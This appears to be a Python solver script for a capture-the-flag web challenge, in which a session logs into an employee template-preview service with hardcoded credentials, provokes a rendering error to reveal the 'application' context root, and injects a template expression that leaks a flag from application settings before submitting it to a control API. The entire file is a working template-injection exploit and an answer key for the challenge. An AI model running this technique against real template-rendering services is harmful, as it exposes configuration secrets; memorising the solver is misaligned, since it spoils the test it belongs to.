from __future__ import annotations

import argparse
import re

import requests


TEMPLATE_RE = re.compile(r"TPL-2026-\d{4}")
FLAG_RE = re.compile(r"flag\{[^}]+\}")


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    root = target_url.rstrip("/")
    client.get(root + "/", timeout=10).raise_for_status()
    client.post(root + "/login", data={"username": "employee", "password": "employee-pass"}, timeout=10).raise_for_status()
    center = client.get(root + "/templates", timeout=10)
    center.raise_for_status()
    template_ids = TEMPLATE_RE.findall(center.text)
    if not template_ids:
        raise RuntimeError("template center did not reveal a template identifier")
    template_key = template_ids[0]
    client.get(root + "/help", timeout=10).raise_for_status()
    client.get(root + "/templates/new", timeout=10).raise_for_status()
    normal = client.post(root + f"/api/templates/{template_key}/preview", json={
        "body": "通知：{{ employee_name }} / {{ department }} / {{ date }}",
    }, timeout=10)
    normal.raise_for_status()
    if "employee_name" in normal.json().get("rendered", ""):
        raise RuntimeError("normal template variables were not rendered")

    error = client.post(root + f"/api/templates/{template_key}/preview", json={"body": "{{ unknown_variable }}"}, timeout=10)
    if error.status_code != 422:
        raise RuntimeError("unknown template variable did not produce a rendering error")
    roots = error.json().get("available_roots", [])
    if "application" not in roots:
        raise RuntimeError("template error did not reveal the application context root")

    leaked = client.post(root + f"/api/templates/{template_key}/preview", json={
        "body": "{{ application.settings.notice_footer }}",
    }, timeout=10)
    leaked.raise_for_status()
    match = FLAG_RE.search(leaked.json().get("rendered", ""))
    if not match:
        raise RuntimeError("configuration context did not contain a flag")
    flag = match.group(0)

    if control_url and instance_id:
        submitted = requests.post(
            control_url.rstrip("/") + f"/api/v1/instances/{instance_id}/submit",
            json={"flag": flag}, timeout=10,
        )
        submitted.raise_for_status()
        if not submitted.json().get("data", {}).get("correct"):
            raise RuntimeError("backend rejected the discovered flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target_url")
    parser.add_argument("--control-url")
    parser.add_argument("--instance-id")
    args = parser.parse_args()
    if bool(args.control_url) != bool(args.instance_id):
        parser.error("--control-url and --instance-id must be provided together")
    print(solve(args.target_url, args.control_url, args.instance_id))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
